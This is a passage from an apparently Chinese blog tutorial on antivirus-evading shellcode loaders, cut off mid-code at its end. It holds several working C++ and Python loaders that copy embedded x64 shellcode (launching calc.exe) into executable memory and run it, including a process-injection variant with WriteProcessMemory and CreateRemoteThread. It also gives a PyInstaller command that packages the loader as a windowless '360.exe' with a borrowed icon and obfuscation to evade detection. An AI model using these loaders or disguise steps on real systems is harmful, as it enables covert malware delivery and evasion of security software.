72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">	LPVOID addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 等待线程运行</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">	<span class="comment">// 关闭线程</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python语言加载器"><a href="#Python语言加载器" class="headerlink" title="Python语言加载器"></a>Python语言加载器</h3><h4 id="加载器代码-1"><a href="#加载器代码-1" class="headerlink" title="加载器代码"></a>加载器代码</h4><p>实际上还是借助那些windows api , 但是copy内存的上面是c标准库的函数, 实际上windows 自带的也有copy内存的函数, 那么接下来的编写流程也非常清楚了, 就是如何通过Python代码实现上述那些函数的调用, 以及在Python中16进制的Shellcode是如何字面量定义的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入ctypes库</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从ctypes库中导入windows api函数</span></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory</span><br><span class="line">CreateThread = ctypes.windll.kernel32.CreateThread</span><br><span class="line">WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span></span><br><span class="line">sc = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为c_uint64</span></span><br><span class="line">VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">p = VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(sc), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># 将sc指向指针</span></span><br><span class="line">buf_pointer = (ctypes.c_char * <span class="built_in">len</span>(sc)).from_buffer(sc)</span><br><span class="line">RtlMoveMemory(ctypes.c_void_p(p), buf_pointer, ctypes.c_int(<span class="built_in">len</span>(sc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程</span></span><br><span class="line">h = CreateThread(<span class="literal">None</span>, <span class="number">0</span>, ctypes.c_void_p(p), <span class="literal">None</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待线程结束</span></span><br><span class="line">WaitForSingleObject(h, ctypes.c_int(<span class="number">0xFFFFFFFF</span>))</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>import ctypes</code>: 导入 ctypes 模块,这个模块提供了与 C 语言兼容的数据类型和函数调用方式.</li>
+<li><code>VirtualAlloc</code>,<code>RtlMoveMemory</code>,<code>CreateThread</code>,<code>WaitForSingleObject</code>:这些变量是通过 ctypes获取 kernel32.dll 中相关函数的句柄,用于内存操作和线程创建等操作.</li>
+<li><code>buf = b&quot;\xfc....&quot;</code>定义了一个包含 Shellcode 的字节数组.</li>
+<li><code>sc = bytearray(buf)</code>:将 Shellcode 转换为 bytearray 类型.</li>
+<li><code>VirtualAlloc.restype = ctypes.c_uint64</code>设置<code>VirtualAlloc</code>函数的返回类型为<code>c_uint64</code></li>
+<li><code>p = VirtualAlloc(0, len(sc), 0x3000, 0x40)</code>:调用<code>VirtualAlloc</code>分配内存,用于存放Shellcode.<ul>
+<li><code>0x3000</code>表示分配提交<code>MEM_COMMIT</code>和保留<code>MEM_RESERVE</code>的内存</li>
+<li><code>0x40</code> 表示分配可执行</li>
+</ul>
+</li>
+<li><code>buf_pointer = (ctypes.c_char * len(sc)).from_buffer(sc)</code>将Shellcode的内容指向指针</li>
+<li><code>RtlMoveMemory(ctypes.c_void_p(p), buf_pointer, ctypes.c_int(len(sc)))</code>使用<code>RtlMoveMemory</code>函数将Shellcode复制到申请的内存中.</li>
+<li><code>h = CreateThread(None, 0, ctypes.c_void_p(p), None, 0, None)</code>调用<code>CreateThread</code>创建一个新线程,将刚才分配的内存作为线程的起始地址</li>
+<li><code>WaitForSingleObject(h, ctypes.c_int(0xFFFFFFFF))</code>:<code>h</code> 创建的线程的句柄,<code>ctypes.c_int(0xFFFFFFFF)</code>表示无限期等待这个线程完成</li>
+</ol>
+<h4 id="Pyinstaller打包"><a href="#Pyinstaller打包" class="headerlink" title="Pyinstaller打包"></a>Pyinstaller打包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python38 -m pip install pyinstaller tinyaes</span><br><span class="line">-F 打包成一个exe文件</span><br><span class="line">-w不显示黑窗口 (默认会显示) , 也可以用--noconsole参数</span><br><span class="line">-i指定图标 , .ico文件或者是exe文件 , 会自动提取exe文件的图标 (不推荐图标)</span><br><span class="line">-n指定打包好的文件名</span><br><span class="line">--clean清除上一次打包的文件</span><br><span class="line">--keycjiurfe11a混淆代码功能 (需要安装tinyaes)</span><br><span class="line"></span><br><span class="line">pyinstaller -F -w shellcode.py -i <span class="string">&quot;D:\\Penetration\\BypassAV\\SigThief-master\\sign_exe\\360.exe&quot;</span> -n 360.exe --clean --key cbeugtbutrh</span><br></pre></td></tr></table></figure>
+
+<p>打包好的程序在<code>dist</code>目录下 , <code>dist</code>是<code>distribution</code>的简写 .为发行版本.</p>
+<p><strong>py不支持交叉编译 ,就是Windows你只能打包成exe , 不能打包成Linux上的可执行二进制文件</strong></p>
+<h2 id="内存申请函数"><a href="#内存申请函数" class="headerlink" title="内存申请函数"></a>内存申请函数</h2><h3 id="VirtualAlloc函数-1"><a href="#VirtualAlloc函数-1" class="headerlink" title="VirtualAlloc函数"></a>VirtualAlloc函数</h3><h3 id="VirtualAllocEx函数"><a href="#VirtualAllocEx函数" class="headerlink" title="VirtualAllocEx函数"></a>VirtualAllocEx函数</h3><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p><code>VirtualAllocEx</code>和<code>VirtualAlloc</code>都是Windows操作系统中的内存分配函数,但他们在使用场景和功能上有一些不同.</p>
+<ol>
+<li><p><code>VirtualAlloc</code>用于在当前进程的虚拟地址空间中分配内存.他是一个进程内存分配函数,用于动态分配内存块,供当前进程使用.可以通过设置内存保护属性来指定分配内存的权限,例如:可读写、可执行等.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>VirtualAllocEx</code>用于在其他进程的虚拟地址空间中分配内存,他是一个跨进程的内存分配函数,通常与其他进程间的数据交换、远程线程创建等操作一起使用.可以使用此函数向其他进程注入代码、数据等.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pRemoteMemory = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">4096</span>, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>总结而言,<code>VirtualAlloc</code>主要用于当前进程内分配内存,而<code>VirtualAllocEx</code>则主要用于在其他进程内分配内存.他们都提供了灵活的内存分配方式,但需要根据实际需求选择适当的函数.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取要执行的进程句柄(当前进程)</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="comment">// 在目标进程中分配可读可写不可执行的内存</span></span><br><span class="line">    LPVOID pRemoteMemory = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>,<span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pRemoteMemory != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">// 将Shellcode复制到目标进程的内存中</span></span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteMemory, buf, <span class="built_in">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改内存属性为可执行</span></span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        <span class="built_in">VirtualProtectEx</span>(hProcess, pRemoteMemory, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在目标进程中创建线程执行Shellcode</span></span><br><span class="line">        HANDLE hRemoteThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hRemoteThread, INFINITE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放目标进程中的内存</span></span><br><span class="line">        <span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数.程序执行将在此处开始并结束.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用malloc分配内存</span></span><br><span class="line">    <span class="type">void</span>* pMemory = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span> (pMemory != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 将Shellcode复制到内存中</span></span><br><span class="line">        <span class="built_in">memcpy</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">        <span class="comment">// 将内存标记为可执行</span></span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        <span class="built_in">VirtualProtect</span>(pMemory, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        ((<span class="built_in">void</span>(*)())pMemory)();</span><br><span class="line">        <span class="comment">//释放内存</span></span><br><span class="line">        <span class="built_in">free</span>(pMemory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="HeapAlloc函数"><a href="#HeapAlloc函数" class="headerlink" title="HeapAlloc函数"></a>HeapAlloc函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数.程序执行将在此处开始并结束.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    HANDLE hHrp = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    PVOID Mptr = <span class="built_in">HeapAlloc</span>(hHrp, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Mptr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="内存属性修改"><a href="#内存属性修改" class="headerlink" title="内存属性修改"></a>内存属性修改</h3><p>使用<code>VirtualAlloc</code>函数分配可读可写不可执行的内存,填充shellcode,然后修改内存属性为可执行,最后执行shellcode</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\